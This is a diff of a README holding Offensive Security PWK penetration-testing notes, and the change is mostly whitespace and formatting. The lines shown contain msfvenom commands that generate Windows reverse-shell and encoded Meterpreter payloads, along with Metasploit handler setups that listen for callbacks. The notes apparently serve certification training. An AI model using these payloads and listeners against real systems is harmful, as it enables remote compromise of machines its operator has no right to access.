@@ -17,9 +17,9 @@ Offsec PWK notes and frecuently used files.
 </ol>
 
 <br>
-<br>
 
 #Target IP: 1.1.1.1
+<br>
 #Local IP: 10.10.10.10 
 
 <div id="Scanning"> <h3>1.Scanning and Enumeration</h3></div>
@@ -66,23 +66,23 @@ msf > use auxiliary/scanner/ssh/ssh_enumusers
 
 <h4>MSF Venom Payload Generation</h4>
 
-msfvenom -p windows/shell_reverse_tcp -f asp -o shell.asp LHOST=10.10.10.10 LPORT=443
+    msfvenom -p windows/shell_reverse_tcp -f asp -o shell.asp LHOST=10.10.10.10 LPORT=443
 
-use exploit/multi/handler
-set payload windows/shell/reverse_tcp
-set LHOST 10.10.10.10
-set LPORT 443
-run
+    use exploit/multi/handler
+    set payload windows/shell/reverse_tcp
+    set LHOST 10.10.10.10
+    set LPORT 443
+    run
 
-msfvenom -p windows/meterpreter_reverse_tcp -f exe -o metp.exe -e x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=443
+    msfvenom -p windows/meterpreter_reverse_tcp -f exe -o metp.exe -e x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=443
 
-msfconsole
+    msfconsole
 
-use exploit/multi/handler
-set payload windows/meterpreter_reverse_tcp
-set LHOST 10.10.10.10
-set LPORT 443
-run
+    use exploit/multi/handler
+    set payload windows/meterpreter_reverse_tcp
+    set LHOST 10.10.10.10
+    set LPORT 443
+    run
 
 <h4>Shellshock RCE</h4>
 
